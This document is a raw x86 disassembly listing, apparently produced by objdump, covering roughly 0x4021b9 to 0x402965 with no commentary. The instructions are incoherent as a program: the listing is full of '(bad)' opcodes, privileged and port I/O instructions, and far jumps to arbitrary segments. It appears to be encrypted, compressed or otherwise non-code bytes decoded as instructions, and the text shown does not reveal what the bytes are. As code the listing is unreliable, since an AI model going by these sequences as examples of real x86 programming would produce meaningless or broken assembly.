  4021b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021ba:	aam    0x17
  4021bc:	arpl   di,bp
  4021be:	lds    edx,FWORD PTR [ebp+0x30582981]
  4021c4:	data16 ja 0x402240
  4021c7:	xor    DWORD PTR [esi],ebp
  4021c9:	push   0xd7adb121
  4021ce:	xchg   edx,eax
  4021cf:	fild   DWORD PTR [esi-0x752c9362]
  4021d5:	and    DWORD PTR [esi-0x80],0x763fadc7
  4021dc:	dec    ebp
  4021dd:	and    esp,DWORD PTR [edx]
  4021df:	xchg   ebx,eax
  4021e0:	aam    0xf6
  4021e2:	sbb    eax,0xebad7ba1
  4021e7:	dec    edx
  4021e8:	add    al,0x68
  4021ea:	mov    dh,0xcb
  4021ec:	jmp    0x7bfa0260
  4021f1:	jae    0x40219f
  4021f3:	(bad)  
  4021f4:	js     0x402185
  4021f6:	pop    ecx
  4021f7:	xchg   edx,eax
  4021f8:	inc    esi
  4021f9:	mov    al,0x6c
  4021fb:	jg     0x402198
  4021fd:	add    eax,0xee9acc26
  402202:	int    0x9d
  402204:	cwde   
  402205:	xchg   esp,eax
  402206:	jo     0x40227d
  402208:	and    eax,0xc8f1b563
  40220d:	mov    ds,edx
  40220f:	mov    al,ds:0x9d6f3f94
  402214:	int3   
  402215:	ret    
  402216:	mov    DWORD PTR [eax+edx*1],esi
  402219:	cmovg  ebp,edx
  40221c:	push   esi
  40221d:	push   0x73993085
  402222:	shl    BYTE PTR [ebp+0x9f0a69b],cl
  402228:	sti    
  402229:	sti    
  40222a:	xchg   BYTE PTR [ecx-0x1e090ee5],bh
  402230:	imul   eax,DWORD PTR [edi+ebx*1+0x10],0xffffffc7
  402235:	mov    edx,0x356b244d
  40223a:	mov    ds:0x3317e996,eax
  40223f:	cmp    bh,BYTE PTR [esi+0x616141c6]
  402245:	mov    bh,0x99
  402247:	rcl    al,cl
  402249:	dec    ebp
  40224a:	pop    ss
  40224b:	or     al,0xa1
  40224d:	jmp    0x38e24984
  402252:	dec    ebp
  402253:	inc    ebp
  402254:	sub    eax,0xb4d1052f
  402259:	sub    eax,0x9ea26b85
  40225e:	xchg   edx,eax
  40225f:	outs   dx,BYTE PTR ds:[esi]
  402260:	mov    BYTE PTR [ebp+0x22],bl
  402263:	(bad)  
  402264:	pop    ecx
  402265:	fidiv  WORD PTR [edx+0x65cd4834]
  40226b:	call   0x392c:0xc754f09f
  402272:	ror    BYTE PTR [ebx],1
  402274:	(bad)  
  402275:	popf   
  402276:	push   es
  402277:	mov    ebx,0xd479be79
  40227c:	mov    edx,0xf066cfe8
  402281:	jecxz  0x4022ec
  402283:	add    eax,0xb4b0f84d
  402288:	aad    0x8a
  40228a:	fwait
  40228b:	lods   eax,DWORD PTR ds:[esi]
  40228c:	cwde   
  40228d:	inc    edi
  40228e:	data16 loopne 0x4022b7
  402291:	jecxz  0x402291
  402293:	fld    QWORD PTR [edi+0x2730b307]
  402299:	push   es
  40229a:	xchg   edi,eax
  40229b:	mov    dl,0xe5
  40229d:	ss aaa 
  40229f:	cmp    DWORD PTR [edx+0x45],eax
  4022a2:	sahf   
  4022a3:	loop   0x4022d3
  4022a5:	dec    ebp
  4022a6:	jno    0x402307
  4022a8:	sti    
  4022a9:	(bad)  
  4022aa:	out    dx,al
  4022ab:	les    ecx,FWORD PTR [edi-0x7c]
  4022ae:	mov    DWORD PTR [ebx-0x33416201],edx
  4022b4:	repnz inc ebp
  4022b6:	in     al,0xbb
  4022b8:	jae    0x40228d
  4022ba:	paddusb mm4,QWORD PTR [edx]
  4022bd:	pop    ecx
  4022be:	jmp    0xa77dbda4
  4022c3:	fwait
  4022c4:	imul   esi,DWORD PTR [ecx+0x63],0xffffffe5
  4022c8:	outs   dx,DWORD PTR ds:[esi]
  4022c9:	in     al,0x18
  4022cb:	leave  
  4022cc:	jne    0x40231c
  4022ce:	mov    ss,ebx
  4022d0:	inc    esp
  4022d1:	fimul  WORD PTR [edi+0x3f]
  4022d4:	popa   
  4022d5:	sbb    BYTE PTR [eax],dl
  4022d7:	inc    eax
  4022d8:	ds scas al,BYTE PTR es:[edi]
  4022da:	(bad)  
  4022db:	(bad)  
  4022dc:	dec    ebp
  4022dd:	aaa    
  4022de:	xchg   ecx,eax
  4022df:	xchg   ebx,eax
  4022e0:	int3   
  4022e1:	in     eax,dx
  4022e2:	popa   
  4022e3:	cmp    edx,ebp
  4022e5:	(bad)  
  4022e6:	imul   edi,ebp,0xffffffe6
  4022e9:	inc    ebx
  4022ea:	mov    eax,ds:0x80bdd862
  4022ef:	cs popf 
  4022f1:	adc    edx,DWORD PTR [ecx+0x31]
  4022f4:	into   
  4022f5:	rcl    BYTE PTR [edx+ecx*2-0x6d],0xba
  4022fa:	lods   eax,DWORD PTR ds:[esi]
  4022fb:	sbb    BYTE PTR [ecx+0x59c6e24d],cl
  402301:	(bad)  
  402302:	jl     0x40229d
  402304:	xchg   esp,eax
  402305:	mov    ds:0xad5e1c94,eax
  40230a:	or     bl,ch
  40230c:	dec    esi
  40230d:	xor    DWORD PTR [edi-0x1f],edi
  402310:	int    0x1b
  402312:	push   cs
  402313:	loopne 0x4022ca
  402315:	jg     0x4022a8
  402317:	xor    DWORD PTR [eax],0xffffffb5
  40231a:	sub    ch,ch
  40231c:	xor    al,0xac
  40231e:	in     eax,0x7d
  402320:	sub    esi,ecx
  402322:	shr    DWORD PTR [ecx],cl
  402324:	fwait
  402325:	sbb    al,0xfe
  402327:	mov    dh,0xdd
  402329:	inc    esp
  40232a:	mov    cl,0xc3
  40232c:	sbb    eax,0xa4f0970
  402331:	popf   
  402332:	add    dl,BYTE PTR [ebp-0x30]
  402335:	dec    eax
  402337:	jmp    0xdfb1390a
  40233c:	shr    DWORD PTR [edx-0x37],0x91
  402340:	add    eax,ebx
  402342:	cmp    cl,BYTE PTR [esp+eiz*4]
  402345:	iret   
  402346:	sbb    eax,0x74ac9fea
  40234b:	sbb    al,0x5b
  40234d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40234e:	das    
  40234f:	adc    ebp,0xffffff90
  402352:	inc    ecx
  402353:	mov    ch,BYTE PTR [edx-0x14af00c0]
  402359:	xchg   esi,eax
  40235a:	adc    al,0x47
  40235c:	lods   eax,DWORD PTR ds:[esi]
  40235d:	std    
  40235e:	pop    ebp
  40235f:	sub    ebp,DWORD PTR [eax-0x6fa45aca]
  402365:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402366:	push   0xc
  402368:	fiadd  DWORD PTR [ebx-0x2b055c88]
  40236e:	mov    dh,0xad
  402370:	mov    ebp,ebp
  402372:	xchg   esi,edi
  402374:	aas    
  402375:	push   ds
  402376:	lods   al,BYTE PTR ds:[esi]
  402377:	push   ds
  402378:	cmc    
  402379:	or     BYTE PTR [ebx+0x31],ah
  40237c:	and    ecx,DWORD PTR [eax]
  40237e:	iret   
  40237f:	ret    
  402380:	into   
  402381:	sub    al,al
  402383:	xchg   edx,eax
  402384:	sub    bh,bl
  402386:	outs   dx,BYTE PTR ds:[esi]
  402387:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402388:	xchg   edx,esi
  40238a:	add    al,BYTE PTR [ecx-0x1d]
  40238d:	sbb    BYTE PTR [edx],0x2c
  402390:	ret    0x32c2
  402393:	jle    0x4023ed
  402395:	jae    0x4023aa
  402397:	out    0x13,al
  402399:	jne    0x4023c7
  40239b:	push   ss
  40239c:	repz in al,dx
  40239e:	xor    eax,0x13c196ca
  4023a3:	xchg   BYTE PTR [ecx],dl
  4023a5:	fld    DWORD PTR [ebx]
  4023a7:	fldcw  WORD PTR [esi]
  4023a9:	cmp    ebp,DWORD PTR [edi-0x12da9bbd]
  4023af:	jno    0x4023be
  4023b1:	lock pop esi
  4023b3:	inc    ecx
  4023b4:	pusha  
  4023b5:	rcr    DWORD PTR [edx],0x95
  4023b8:	jnp    0x402382
  4023ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023bb:	in     al,dx
  4023bc:	add    eax,0x462336c0
  4023c1:	mov    esp,0xb550be4b
  4023c6:	pop    edi
  4023c7:	dec    esi
  4023c8:	sar    WORD PTR [edi],0x30
  4023cc:	and    BYTE PTR [edi+0x5129ad6b],cl
  4023d2:	rcr    BYTE PTR [edi+0x4a],cl
  4023d5:	mov    ds:0xfe4226ee,al
  4023da:	(bad)  
  4023db:	into   
  4023dc:	jo     0x402373
  4023de:	out    dx,al
  4023df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023e0:	call   0x4fe48cf4
  4023e5:	cs into 
  4023e7:	sahf   
  4023e8:	mov    dl,0x5
  4023ea:	pop    edx
  4023eb:	sub    bh,BYTE PTR [ebp-0x22]
  4023ee:	leave  
  4023ef:	icebp  
  4023f0:	fcomp  QWORD PTR [ebp*4+0x263ec035]
  4023f7:	mov    bh,0x90
  4023f9:	pop    ebx
  4023fa:	push   edi
  4023fb:	(bad)  
  4023fc:	cmp    BYTE PTR [edx],dh
  4023fe:	test   al,0xa8
  402400:	mov    cl,0xc1
  402402:	xchg   bl,dl
  402404:	addr16 das 
  402406:	jl     0x4023b6
  402408:	inc    edi
  402409:	pop    esp
  40240a:	imul   eax,edi,0xffffff93
  40240d:	imul   edi,DWORD PTR [ebp+ebx*1+0x71],0xd
  402412:	inc    esp
  402413:	cwde   
  402414:	lods   al,BYTE PTR ds:[esi]
  402415:	call   0x3fe9:0x5fed8f2c
  40241c:	dec    ecx
  40241d:	add    al,0xb7
  40241f:	jne    0x402492
  402421:	js     0x402421
  402423:	retf   
  402424:	and    al,0x5b
  402426:	jmp    0x530:0xad63ceb6
  40242d:	cmp    eax,0x8d47ab46
  402432:	jg     0x402469
  402434:	mov    bh,0x66
  402436:	sahf   
  402437:	jmp    0x7c6c:0xb13341e6
  40243e:	cli    
  40243f:	outs   dx,DWORD PTR ds:[esi]
  402440:	sar    DWORD PTR [ebx+esi*4+0x50058a1d],cl
  402447:	push   eax
  402448:	push   ebp
  402449:	pop    eax
  40244a:	int    0x47
  40244c:	(bad)  
  40244d:	out    0x60,eax
  40244f:	enter  0x5f00,0x2d
  402453:	mov    eax,ds:0xaa915c1c
  402458:	jmp    0xce852af0
  40245d:	jo     0x4023f7
  40245f:	jmp    0x402420
  402461:	es dec esi
  402463:	and    bl,BYTE PTR [ebx+0x78bc94a]
  402469:	push   edx
  40246a:	xor    BYTE PTR [ebx-0x8f666e3],al
  402470:	inc    esp
  402471:	xchg   DWORD PTR [eax+0x2a],esi
  402474:	stos   DWORD PTR es:[edi],eax
  402475:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402476:	enter  0xf7ce,0xf4
  40247a:	(bad)  
  40247b:	jnp    0x4024e6
  40247d:	pop    ebp
  40247e:	cmp    ch,ah
  402480:	cmp    BYTE PTR [edi],0x5
  402483:	outs   dx,BYTE PTR ds:[esi]
  402484:	cmp    edi,DWORD PTR [esi-0x5c0785bf]
  40248a:	ds mov edi,0x86eb27df
  402490:	(bad)  
  402491:	mov    edi,0x32c018b5
  402496:	sub    bh,BYTE PTR [edi+0x353f422]
  40249c:	test   al,0xbe
  40249e:	(bad)  
  40249f:	xlat   BYTE PTR ds:[ebx]
  4024a0:	cmp    bh,BYTE PTR [edi-0x4b]
  4024a3:	or     DWORD PTR [ebx],0x15
  4024a6:	inc    ebp
  4024a7:	(bad)  
  4024a9:	mov    bl,0xac
  4024ab:	lea    ebp,[edi+eax*4-0x592218a7]
  4024b2:	mov    edi,ebp
  4024b4:	or     eax,ebx
  4024b6:	ret    0xc38b
  4024b9:	jp     0x4024a1
  4024bb:	inc    eax
  4024bc:	and    BYTE PTR [edi+0x17],dh
  4024bf:	in     eax,dx
  4024c0:	repz into 
  4024c2:	mov    ds,WORD PTR [eax]
  4024c4:	test   eax,0xa2942323
  4024c9:	sahf   
  4024ca:	jg     0x40246e
  4024cc:	jle    0x4024fd
  4024ce:	ror    al,cl
  4024d0:	(bad)  
  4024d1:	xor    ebx,ebp
  4024d3:	pop    edi
  4024d4:	mov    cl,0xcc
  4024d6:	cmp    bh,BYTE PTR [ecx-0x7966e666]
  4024dc:	pop    esp
  4024dd:	retf   0xcc10
  4024e0:	push   ebp
  4024e1:	cmp    BYTE PTR [ecx*2+0x173cd547],dl
  4024e8:	mov    edi,0xe50ce379
  4024ed:	int3   
  4024ee:	sbb    BYTE PTR [ecx],ah
  4024f0:	xlat   BYTE PTR ds:[ebx]
  4024f1:	jo     0x402525
  4024f3:	imul   edi,DWORD PTR [esi+edx*8],0x5a7b3f64
  4024fa:	sbb    al,0xf4
  4024fc:	or     cl,ch
  4024fe:	cmc    
  4024ff:	sbb    DWORD PTR [ecx+0x70],0xffffff88
  402503:	jp     0x402566
  402505:	idiv   BYTE PTR [ecx-0x57]
  402508:	test   BYTE PTR [ebp+0x2],dl
  40250b:	sbb    cl,al
  40250d:	xchg   esi,eax
  40250e:	sub    ebx,DWORD PTR [edi]
  402510:	mov    ch,bl
  402512:	pushf  
  402513:	out    0xc9,al
  402515:	ss dec edi
  402517:	pop    ebx
  402518:	repz fist WORD PTR [edx+ebx*8]
  40251c:	scas   al,BYTE PTR es:[edi]
  40251d:	mov    ebp,0xab916851
  402522:	fwait
  402523:	es inc esi
  402525:	ins    DWORD PTR es:[edi],dx
  402526:	add    eax,0x3719dde2
  40252b:	jne    0x40256d
  40252d:	xor    al,0xc8
  40252f:	xor    DWORD PTR [eax],ebp
  402531:	push   edi
  402532:	retf   
  402533:	fsubr  DWORD PTR [ebp-0x7e29d048]
  402539:	inc    eax
  40253a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40253b:	fist   WORD PTR [ecx+0x42]
  40253e:	xor    dl,BYTE PTR [ebx+esi*2]
  402541:	repnz enter 0xab7c,0x37
  402546:	fcmovnb st,st(5)
  402548:	xchg   esi,eax
  402549:	add    al,BYTE PTR ds:0xe6db91d6
  40254f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402550:	(bad)  
  402551:	stc    
  402552:	mov    eax,ds:0x2ad53108
  402557:	sahf   
  402558:	and    al,0xe6
  40255a:	adc    BYTE PTR ds:0x4d128942,bl
  402560:	out    0x6d,al
  402562:	mov    ds:0x6e37deff,eax
  402567:	mov    DWORD PTR [ebp+eax*4-0x4b3546ae],edi
  40256e:	xchg   esi,eax
  40256f:	xor    ecx,DWORD PTR [edx]
  402571:	jmp    0x4024f9
  402573:	jmp    0xb9a4:0xd80ed4cf
  40257a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40257b:	and    esi,DWORD PTR [esi]
  40257d:	cmp    BYTE PTR ds:0xea1735bd,ah
  402583:	fld    QWORD PTR [edi]
  402585:	jp     0x402566
  402587:	and    DWORD PTR [ebx-0x23dcd171],ecx
  40258d:	xchg   edx,eax
  40258e:	mov    esp,0x3a9076b3
  402593:	fld    TBYTE PTR [ebp-0x16]
  402596:	daa    
  402597:	jmp    0x40257e
  402599:	push   0x21
  40259b:	data16 fistp WORD PTR [edx]
  40259e:	mov    DWORD PTR [ebp-0x11],ebp
  4025a1:	in     al,dx
  4025a2:	xchg   edx,eax
  4025a3:	and    al,0x9f
  4025a5:	repz test al,0x3c
  4025a8:	scas   al,BYTE PTR es:[edi]
  4025a9:	push   ss
  4025aa:	(bad)  
  4025ab:	jmp    DWORD PTR [edx+ecx*4+0x4e]
  4025af:	and    esi,DWORD PTR [esi-0x7ddcc94d]
  4025b5:	ret    0x8e74
  4025b8:	push   esp
  4025b9:	out    dx,eax
  4025ba:	fwait
  4025bb:	(bad)  
  4025bc:	mov    edi,0x5d9f3a68
  4025c1:	push   edx
  4025c2:	cmp    al,0x81
  4025c4:	xor    al,0x32
  4025c6:	ss jg  0x402646
  4025c9:	loopne 0x402593
  4025cb:	add    dh,dl
  4025cd:	pop    esp
  4025ce:	sbb    bl,bl
  4025d0:	jns    0x40264b
  4025d2:	out    dx,al
  4025d3:	icebp  
  4025d4:	imul   esi,ebp,0xffffff99
  4025d7:	int    0x57
  4025d9:	sbb    BYTE PTR [esi+0x78762937],0x6e
  4025e0:	xchg   DWORD PTR [esi+0x38a53a02],ebx
  4025e6:	(bad)  
  4025e7:	sub    dh,BYTE PTR [ebp+0x76]
  4025ea:	ret    0x7aaa
  4025ed:	(bad)  
  4025ee:	adc    eax,0x7d2ebd5d
  4025f3:	push   ds
  4025f4:	inc    ebx
  4025f5:	adc    DWORD PTR [ebp-0x4b],ebp
  4025f8:	mov    dh,0xea
  4025fa:	std    
  4025fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025fc:	sub    ebx,DWORD PTR [edx+0x27]
  4025ff:	(bad)  
  402600:	mov    edi,0x9151ee4c
  402605:	iret   
  402606:	mov    DWORD PTR [edx-0x3fcbf104],edx
  40260c:	mov    ss,ecx
  40260e:	jmp    0x4e6d:0xe7f1f3b3
  402615:	dec    edx
  402616:	add    dh,dh
  402618:	inc    edx
  402619:	aaa    
  40261a:	push   ecx
  40261b:	das    
  40261c:	in     eax,0xa8
  40261e:	and    BYTE PTR [edi+0x463f4d76],bh
  402624:	push   eax
  402625:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402626:	adc    BYTE PTR ds:0x9a73236b,0xcc
  40262d:	mov    bh,0x84
  40262f:	mov    ds:0x81481b60,eax
  402634:	cmp    eax,0x814134a9
  402639:	aad    0x47
  40263b:	jns    0x402651
  40263d:	xchg   ecx,eax
  40263e:	scas   al,BYTE PTR es:[edi]
  40263f:	nop
  402640:	inc    edi
  402641:	pop    ebx
  402642:	mov    ebp,0x16fde235
  402647:	mul    edx
  402649:	push   ebx
  40264a:	dec    ecx
  40264b:	les    edi,FWORD PTR [ecx]
  40264d:	pusha  
  40264e:	push   0x38
  402650:	stos   BYTE PTR es:[edi],al
  402651:	cmp    BYTE PTR gs:[eax-0x68],ah
  402655:	lahf   
  402656:	mov    dl,BYTE PTR [esi+0x26735504]
  40265c:	(bad)  
  40265e:	loope  0x4025f4
  402660:	cmp    cl,al
  402662:	es push eax
  402664:	in     al,0xcf
  402666:	call   0x4613:0xb470328d
  40266d:	lea    edx,[esi+0x52afaa5f]
  402673:	push   esp
  402674:	fld    QWORD PTR [esi-0x68]
  402677:	pusha  
  402678:	mov    ecx,0xd13fe53f
  40267d:	mov    eax,0xca7285dc
  402682:	mov    cl,0x18
  402684:	or     DWORD PTR [edx-0x3205ce6f],ecx
  40268a:	div    DWORD PTR [eax]
  40268c:	outs   dx,BYTE PTR ds:[esi]
  40268d:	adc    dl,cl
  40268f:	jb     0x40264b
  402691:	and    ebp,esp
  402693:	mov    ah,0x8f
  402695:	arpl   WORD PTR [eax-0x80],di
  402698:	mov    DWORD PTR [edx+ebp*4+0x40],eax
  40269c:	(bad)  
  40269d:	jle    0x40266b
  40269f:	aam    0x91
  4026a1:	mov    ch,0x86
  4026a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026a4:	enter  0xff8e,0x81
  4026a8:	dec    esp
  4026a9:	loope  0x4026ee
  4026ab:	ja     0x4026fb
  4026ad:	lds    bp,DWORD PTR [ebp+edi*8-0x8]
  4026b2:	scas   eax,DWORD PTR es:[edi]
  4026b3:	sub    DWORD PTR [edx],0x9c99cd4a
  4026b9:	mov    eax,ds:0x49146e59
  4026be:	fdivr  QWORD PTR [eax+edx*4]
  4026c1:	or     esp,edx
  4026c3:	out    dx,al
  4026c4:	mov    cs,WORD PTR [edx-0x42684a04]
  4026ca:	add    edi,edi
  4026cc:	pop    esp
  4026cd:	sub    eax,DWORD PTR [ebx+0xbb9ac4e]
  4026d3:	je     0x40265f
  4026d5:	test   al,0xc1
  4026d7:	xor    ebx,DWORD PTR [eax+0x1e]
  4026da:	xchg   ebx,eax
  4026db:	dec    edi
  4026dc:	jge    0x4026cc
  4026de:	dec    esp
  4026df:	out    0x17,al
  4026e1:	mov    edx,0x78bf089a
  4026e6:	jnp    0x402714
  4026e8:	and    ah,BYTE PTR [edx]
  4026ea:	jbe    0x4026cd
  4026ec:	mov    WORD PTR ds:0x4aabd007,fs
  4026f2:	aas    
  4026f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026f4:	in     al,dx
  4026f5:	lea    esp,[eax-0x5d]
  4026f8:	add    al,0x5
  4026fa:	mov    ecx,0x11064e8e
  4026ff:	or     ebx,DWORD PTR [ecx+0x21ccd360]
  402705:	clc    
  402706:	or     ch,dl
  402708:	mov    ebx,0x71fe16ec
  40270d:	push   ds
  40270e:	cli    
  40270f:	dec    ecx
  402710:	sbb    DWORD PTR [eax+0x7a],esi
  402713:	mov    ah,0xf3
  402715:	repz arpl bx,bp
  402718:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402719:	jge    0x40276c
  40271b:	loop   0x40273f
  40271d:	xchg   edi,eax
  40271e:	dec    esi
  40271f:	push   cs
  402720:	jle    0x40270b
  402722:	mov    BYTE PTR [edx],cl
  402724:	xchg   DWORD PTR [edx+0x7767f206],esp
  40272a:	push   ss
  40272b:	cld    
  40272c:	push   eax
  40272d:	sbb    al,0x5c
  40272f:	(bad)  
  402730:	arpl   WORD PTR ds:[edx-0x6ad0fe2],si
  402737:	int    0xb
  402739:	adc    eax,0x2a10e370
  40273e:	out    0x76,al
  402740:	sbb    dl,BYTE PTR [eax+eiz*4]
  402743:	cmp    al,0x5
  402745:	lds    ebp,FWORD PTR [ebx]
  402747:	repz jae 0x402775
  40274a:	leave  
  40274b:	or     al,0x76
  40274d:	mov    al,ds:0x4ba1d3e7
  402752:	pusha  
  402753:	jbe    0x402762
  402755:	mov    edi,0xe4a8e887
  40275a:	and    eax,0x5af12a59
  40275f:	out    0xe7,eax
  402761:	mov    dl,0xbf
  402763:	dec    eax
  402764:	loopne 0x4027b6
  402766:	jge    0x4027a3
  402768:	arpl   WORD PTR [edi],bp
  40276a:	shl    cl,cl
  40276c:	sub    ecx,DWORD PTR [eax+0x32]
  40276f:	loop   0x4027a3
  402771:	sbb    al,0x7f
  402773:	mov    eax,0x3f4099e9
  402778:	rcl    ebx,0x55
  40277b:	mov    bl,0x97
  40277d:	cli    
  40277e:	ins    DWORD PTR es:[edi],dx
  40277f:	fcomi  st,st(3)
  402781:	out    dx,al
  402782:	into   
  402783:	xchg   ebx,eax
  402784:	pushf  
  402785:	rcr    BYTE PTR ds:0x37d0ebfb,1
  40278b:	jmp    0x3496:0xe98cd199
  402792:	xchg   edx,eax
  402793:	iret   
  402794:	jnp    0x4027b7
  402796:	push   esi
  402797:	in     al,0x71
  402799:	xor    al,0x19
  40279b:	jg     0x402818
  40279d:	sbb    cl,bh
  40279f:	add    al,0x6e
  4027a1:	inc    ecx
  4027a2:	icebp  
  4027a3:	lods   eax,DWORD PTR gs:[esi]
  4027a5:	neg    ebp
  4027a7:	jge    0x4027d0
  4027a9:	pop    esi
  4027aa:	push   ecx
  4027ab:	hlt    
  4027ac:	and    bh,BYTE PTR [ebp-0x12821649]
  4027b2:	ja     0x4027dc
  4027b4:	fist   DWORD PTR [ebp+0x6b23b63e]
  4027ba:	mov    gs,WORD PTR [esi-0x47]
  4027bd:	and    ecx,DWORD PTR [ebx-0x525d2b33]
  4027c3:	(bad)  
  4027c4:	shl    BYTE PTR [edi-0x7727d4bf],cl
  4027ca:	outs   dx,DWORD PTR ds:[esi]
  4027cb:	and    al,0x1e
  4027cd:	xchg   edi,eax
  4027ce:	xchg   esi,eax
  4027cf:	out    dx,eax
  4027d0:	repz in al,dx
  4027d2:	cmp    al,0x52
  4027d4:	test   al,0xa3
  4027d6:	push   ss
  4027d7:	jae    0x402844
  4027d9:	sbb    DWORD PTR [esi],edi
  4027db:	jno    0x402822
  4027dd:	jp     0x402800
  4027df:	push   ds
  4027e0:	fisttp WORD PTR [esi-0x445f9d80]
  4027e6:	xchg   ebx,eax
  4027e7:	dec    ecx
  4027e8:	hlt    
  4027e9:	sbb    BYTE PTR [esi+eax*4-0x22],dl
  4027ed:	sub    BYTE PTR [eax+esi*4+0x3a],al
  4027f1:	rol    BYTE PTR [esp+ecx*4+0x6ef2fbe8],1
  4027f8:	and    al,0x64
  4027fa:	xor    BYTE PTR cs:[edi+0x17cbb165],0xe6
  402802:	sbb    al,0x32
  402804:	push   ebp
  402805:	xchg   edx,eax
  402806:	mov    al,ds:0xd0637dd2
  40280b:	mov    bh,0x1d
  40280d:	test   DWORD PTR [eax+0x78],edx
  402810:	inc    dl
  402812:	inc    eax
  402813:	fimul  DWORD PTR [esi+0x35d9be6]
  402819:	cli    
  40281a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40281b:	(bad)  
  40281c:	push   esi
  40281d:	mov    ds:0xdf1bed70,ax
  402823:	add    eax,0x2a96b728
  402828:	xchg   edi,eax
  402829:	int    0x70
  40282b:	or     BYTE PTR [eax+0x6a956713],ah
  402831:	or     eax,0xa90fc0dc
  402836:	rol    DWORD PTR [esi+0x21],1
  402839:	in     eax,dx
  40283a:	mov    cl,0xa6
  40283c:	pusha  
  40283d:	or     DWORD PTR [edi+0x79],0x62
  402841:	or     BYTE PTR [ebp-0x71],cl
  402844:	shl    DWORD PTR [edi-0x59222d54],0x67
  40284b:	mov    dh,0x72
  40284d:	(bad)  
  40284e:	aaa    
  40284f:	push   0x55
  402851:	sar    BYTE PTR ds:[esp+esi*4-0xfc66ecb],1
  402859:	jnp    0x4027f0
  40285b:	mov    edi,0xa026f6c1
  402860:	daa    
  402861:	retf   
  402862:	xor    BYTE PTR [eax],dh
  402864:	fidiv  WORD PTR [esi-0x6f8bffa]
  40286a:	iret   
  40286b:	dec    edx
  40286c:	cdq    
  40286d:	repnz mov dh,0x74
  402870:	test   BYTE PTR [edx],0x15
  402873:	outs   dx,BYTE PTR ds:[esi]
  402875:	mov    al,0x5f
  402877:	add    bh,BYTE PTR [ecx+0x12edead0]
  40287d:	dec    edx
  40287e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40287f:	pop    esp
  402880:	in     eax,0xca
  402882:	or     BYTE PTR [ebp+edi*4+0x5a],ch
  402886:	push   edx
  402887:	jbe    0x402827
  402889:	pop    edi
  40288a:	int    0x8b
  40288c:	xchg   edi,ecx
  40288e:	jmp    0x62fc:0x22493ef5
  402895:	inc    edi
  402896:	test   BYTE PTR [ecx],dl
  402898:	test   al,0xc9
  40289a:	int    0x79
  40289c:	dec    edx
  40289e:	pop    esi
  40289f:	(bad)  
  4028a0:	sbb    edi,esp
  4028a2:	cmp    bh,BYTE PTR [ebx-0x20ecafc3]
  4028a8:	cmp    ecx,edx
  4028aa:	jns    0x402928
  4028ac:	inc    eax
  4028ad:	sub    al,0x7e
  4028af:	add    DWORD PTR [ebp-0x70d81073],ebx
  4028b5:	mov    bh,0xa6
  4028b7:	or     ch,BYTE PTR [ecx+0x69]
  4028ba:	xchg   ecx,eax
  4028bb:	lods   eax,DWORD PTR ds:[esi]
  4028bc:	push   ds
  4028bd:	cmovno edx,DWORD PTR [eax]
  4028c0:	aam    0x22
  4028c2:	mov    dl,ch
  4028c4:	fwait
  4028c5:	xchg   ebp,eax
  4028c6:	dec    eax
  4028c7:	test   ebx,edi
  4028c9:	pop    esi
  4028ca:	sbb    BYTE PTR ds:[ecx+0x16],bl
  4028ce:	mov    esi,0x2856f814
  4028d3:	xchg   edx,eax
  4028d4:	rcl    DWORD PTR [ecx-0x2d89a2c9],1
  4028da:	jecxz  0x402946
  4028dc:	xor    DWORD PTR [edx],0x9
  4028df:	js     0x40292d
  4028e1:	and    al,0xa1
  4028e3:	xchg   ecx,eax
  4028e4:	ins    BYTE PTR es:[edi],dx
  4028e5:	(bad)  
  4028e6:	or     BYTE PTR [esp+eax*8],dl
  4028e9:	jo     0x4028f4
  4028eb:	lods   al,BYTE PTR ds:[esi]
  4028ec:	je     0x40295d
  4028ee:	dec    edx
  4028ef:	jp     0x402875
  4028f1:	enter  0x353e,0xdb
  4028f5:	daa    
  4028f6:	mov    ah,0xdb
  4028f8:	popf   
  4028f9:	adc    ecx,ebx
  4028fb:	pop    edx
  4028fc:	or     al,0x4a
  4028fe:	arpl   WORD PTR [ebx],sp
  402900:	or     esp,DWORD PTR [ebx]
  402902:	mov    dl,0x32
  402904:	sahf   
  402905:	add    dh,BYTE PTR [eax]
  402907:	or     esp,DWORD PTR [eax*8+0x675eed0f]
  40290e:	jp     0x402927
  402910:	loope  0x402931
  402912:	cs (bad) 
  402914:	pop    ss
  402915:	xor    DWORD PTR [edi-0x37c708db],edx
  40291b:	rcr    DWORD PTR [edi],0x68
  40291e:	out    0x6f,eax
  402920:	add    bl,al
  402922:	test   BYTE PTR [ebx-0x6],dh
  402925:	mov    al,cl
  402927:	dec    esi
  402928:	dec    esi
  402929:	or     dh,ah
  40292b:	mov    ds:0xdc60688e,eax
  402930:	xchg   esp,eax
  402931:	aaa    
  402932:	ins    DWORD PTR es:[edi],dx
  402933:	add    bh,BYTE PTR [ecx-0x4e]
  402936:	fdiv   st(5),st
  402938:	pop    edx
  402939:	enter  0x2050,0x13
  40293d:	ins    DWORD PTR es:[edi],dx
  40293e:	inc    ebp
  40293f:	jge    0x40295d
  402941:	outs   dx,DWORD PTR ds:[esi]
  402942:	rcr    BYTE PTR [edx+0x7c1aaf23],1
  402948:	fcom   st(5)
  40294a:	jbe    0x40296a
  40294c:	dec    ebx
  40294d:	cld    
  40294e:	test   BYTE PTR [esi],bh
  402950:	bound  eax,QWORD PTR [ecx+0x5a94a925]
  402956:	(bad)  
  402957:	xchg   ebp,eax
  402958:	xor    eax,0x72f25bfe
  40295d:	pop    esi
  40295e:	mov    eax,ds:0x5c3f1b0f
  402963:	in     al,dx
  402964:	(bad)  
  402965:	(bad)  
